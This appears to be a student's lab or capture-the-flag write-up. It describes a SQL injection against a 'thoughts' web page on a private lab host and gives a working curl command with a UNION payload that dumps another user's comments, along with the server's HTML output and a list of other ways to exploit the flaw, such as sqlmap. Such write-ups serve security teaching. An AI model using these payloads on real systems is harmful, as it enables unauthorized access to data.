The SQL injection in this one was relatively trivial, since it seems that the
query used AND to limit the selection to only seoh's comments. If we ended the
query right there (by ending the ' and commenting out the rest of the string),
then we can get all the comments for this picture.

This was the first method that worked for me. Since this vulnerability is pretty
bad, there's a lot more ways to exploit it:

  - Just query them all and LIMIT x, offset
  - Use a UNION operation
  - Use sqlmap, it could probably spawn a shell.

Interestingly enough, one of the answers seem to be hardcoded into the application.
Here's the output:

student@xenial64s:~$ curl -k https://192.168.16.1/thought.php -X POST --data "picture=' and 1=0 union select thought, thought, thought from group_thought where username='seoh';--"
<!doctype html>
<head>
	<title>Thoughts</title>
</head>
<body>
<img src='/img/' and 1=0 union select thought, thought, thought from group_thought where username='seoh';--'><table border=1>
<tr><th>Username</th><th>Picture</th><th>Thought</th>
<tr><td>Awesome book</td><td>Awesome book</td><td>Awesome book</td></tr>
<tr><td>Great picture</td><td>Great picture</td><td>Great picture</td></tr>
</table>
<br><strong>seoh's thoughts on ' and 1=0 union select thought, thought, thought from group_thought where username='seoh';--</strong>:<br><i>Great picture</i><br>
<br><form method="post">
<select id="picture" name="picture">
<option value="infinitejest.jpg">Infinite Jest</option>
<option value="glamorama.jpg">Glamorama</option>
</select>
<input type="submit" value="Fetch" />
</form>
<br><br>Lost? Home is <a href="/index.php">this</a> way.<br>
</body>
</html>

